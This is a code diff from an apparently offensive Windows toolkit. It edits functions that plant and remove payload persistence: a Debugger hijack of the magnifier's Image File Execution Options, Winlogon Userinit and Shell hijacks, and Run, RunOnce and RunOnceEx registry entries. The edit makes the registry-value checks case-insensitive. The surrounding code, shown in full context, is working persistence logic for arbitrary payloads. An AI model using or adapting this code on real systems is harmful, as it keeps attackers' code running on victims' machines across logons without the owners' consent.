@@ -230,10 +230,10 @@ def persist3(payload, name="", check=True, add=True):
 
     accessibility_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"
 
-    val = read_key("hklm", magnify_key, "Debugger")
+    val = read_key("hklm", magnify_key, "Debugger").lower()
 
     if not add:
-        if check and val != " ".join(payload):
+        if check and val != " ".join(payload).lower():
             return -1
         if remove_key(hkey="hklm", path=accessibility_key, name="Configuration"):
             if remove_key(hkey="hklm", path=magnify_key, delete_key=True):
@@ -244,7 +244,7 @@ def persist3(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != " ".join(payload) and os.path.exists(target) and not access(target):
+    if check and val != " ".join(payload).lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hklm", path=magnify_key, name="Debugger", value=" ".join(payload), create=True):
@@ -276,9 +276,9 @@ def persist4(payload, name="", check=True, add=True):
     winlogon = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
     p = os.path.join(system_directory(), "userinit.exe,")
 
-    val = read_key("hklm", winlogon, "Userinit")
+    val = read_key("hklm", winlogon, "Userinit").lower()
     if not add:
-        if check and val != f'{p}explorer "{" ".join(payload)}"':
+        if check and val != f'{p}explorer "{" ".join(payload)}"'.lower():
             return -1
         if modify_key(hkey="hklm", path=winlogon, name="Userinit", value=p):
             log.info("Successfully removed persistence")
@@ -287,7 +287,7 @@ def persist4(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != f'{p}explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+    if check and val != f'{p}explorer "{" ".join(payload)}"'.lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hklm", path=winlogon, name="Userinit", value=f'{p}explorer "{" ".join(payload)}"'):
@@ -311,9 +311,9 @@ persist5_info = {
 
 
 def persist5(payload, name="", check=True, add=True):
-    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name)
+    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name).lower()
     if not add:
-        if check and val != f'explorer "{" ".join(payload)}"':
+        if check and val != f'explorer "{" ".join(payload)}"'.lower():
             return -1
         if remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name):
             log.info("Successfully removed persistence")
@@ -322,7 +322,7 @@ def persist5(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+    if check and val != f'explorer "{" ".join(payload)}"'.lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\Run", name=name, value=f'explorer "{" ".join(payload)}"'):
@@ -355,9 +355,9 @@ def persist6(payload, name="", check=True, add=True):
     else:
         kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
-    val = read_key("hklm", kpath, name)
+    val = read_key("hklm", kpath, name).lower()
     if not add:
-        if check and val != f'explorer "{" ".join(payload)}"':
+        if check and val != f'explorer "{" ".join(payload)}"'.lower():
             return -1
         if remove_key(hkey="hklm", path=kpath, name=name):
             log.info("Successfully removed persistence")
@@ -366,7 +366,7 @@ def persist6(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+    if check and val != f'explorer "{" ".join(payload)}"'.lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hklm", path=kpath, name=name, value=f'explorer "{" ".join(payload)}"'):
@@ -695,9 +695,9 @@ persist13_info = {
 
 
 def persist13(payload, name="", check=True, add=True):
-    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name)
+    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name).lower()
     if not add:
-        if check and val != f'explorer "{" ".join(payload)}"':
+        if check and val != f'explorer "{" ".join(payload)}"'.lower():
             return -1
         if remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name=name):
             log.info("Successfully removed persistence")
@@ -706,7 +706,7 @@ def persist13(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+    if check and val != f'explorer "{" ".join(payload)}"'.lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", name=name, value=f'explorer "{" ".join(payload)}"'):
@@ -739,9 +739,9 @@ def persist14(payload, name="", check=True, add=True):
     else:
         kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
 
-    val = read_key("hklm", kpath, name)
+    val = read_key("hklm", kpath, name).lower()
     if not add:
-        if check and val != f'explorer "{" ".join(payload)}"':
+        if check and val != f'explorer "{" ".join(payload)}"'.lower():
             return -1
         if remove_key(hkey="hklm", path=kpath, name=name):
             log.info("Successfully removed persistence")
@@ -750,7 +750,7 @@ def persist14(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+    if check and val != f'explorer "{" ".join(payload)}"'.lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hklm", path=kpath, name=name, value=f'explorer "{" ".join(payload)}"'):
@@ -774,9 +774,9 @@ persist15_info = {
 
 
 def persist15(payload, name="", check=True, add=True):
-    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name)
+    val = read_key("hkcu", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name).lower()
     if not add:
-        if check and val != f'explorer "{" ".join(payload)}"':
+        if check and val != f'explorer "{" ".join(payload)}"'.lower():
             return -1
         if remove_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name=name):
             log.info("Successfully removed persistence")
@@ -785,7 +785,7 @@ def persist15(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+    if check and val != f'explorer "{" ".join(payload)}"'.lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hkcu", path="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", name=name, value=f'explorer "{" ".join(payload)}"'):
@@ -818,9 +818,9 @@ def persist16(payload, name="", check=True, add=True):
     else:
         kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx"
 
-    val = read_key("hklm", kpath, name)
+    val = read_key("hklm", kpath, name).lower()
     if not add:
-        if check and val != f'explorer "{" ".join(payload)}"':
+        if check and val != f'explorer "{" ".join(payload)}"'.lower():
             return -1
         if remove_key(hkey="hklm", path=kpath, name=name):
             log.info("Successfully removed persistence")
@@ -829,7 +829,7 @@ def persist16(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != f'explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+    if check and val != f'explorer "{" ".join(payload)}"'.lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hklm", path=kpath, name=name, value=f'explorer "{" ".join(payload)}"'):
@@ -854,9 +854,9 @@ persist17_info = {
 
 def persist17(payload, name="", check=True, add=True):
     winlogon = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
-    val = read_key("hkcu", winlogon, "Shell")
+    val = read_key("hkcu", winlogon, "Shell").lower()
     if not add:
-        if check and val != f'explorer.exe,explorer "{" ".join(payload)}"':
+        if check and val != f'explorer.exe,explorer "{" ".join(payload)}"'.lower():
             return -1
         if remove_key(hkey="hkcu", path=winlogon, name="Shell"):
             log.info("Successfully removed persistence")
@@ -865,7 +865,7 @@ def persist17(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != f'explorer.exe,explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+    if check and val != f'explorer.exe,explorer "{" ".join(payload)}"'.lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hkcu", path=winlogon, name="Shell", value=f'explorer.exe,explorer "{" ".join(payload)}"'):
@@ -895,9 +895,9 @@ def persist18(payload, name="", check=True, add=True):
 
     kpath = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
 
-    val = read_key("hklm", kpath, "Shell")
+    val = read_key("hklm", kpath, "Shell").lower()
     if not add:
-        if check and val != f'explorer.exe,explorer "{" ".join(payload)}"':
+        if check and val != f'explorer.exe,explorer "{" ".join(payload)}"'.lower():
             return -1
         if modify_key(hkey="hklm", path=kpath, name="Shell", value="explorer.exe"):
             log.info("Successfully removed persistence")
@@ -906,7 +906,7 @@ def persist18(payload, name="", check=True, add=True):
         return
 
     target = get_target(val)
-    if check and val != f'explorer.exe,explorer "{" ".join(payload)}"' and os.path.exists(target) and not access(target):
+    if check and val != f'explorer.exe,explorer "{" ".join(payload)}"'.lower() and os.path.exists(target) and not access(target):
         return -1
 
     if modify_key(hkey="hklm", path=kpath, name="Shell", value=f'explorer.exe,explorer "{" ".join(payload)}"'):
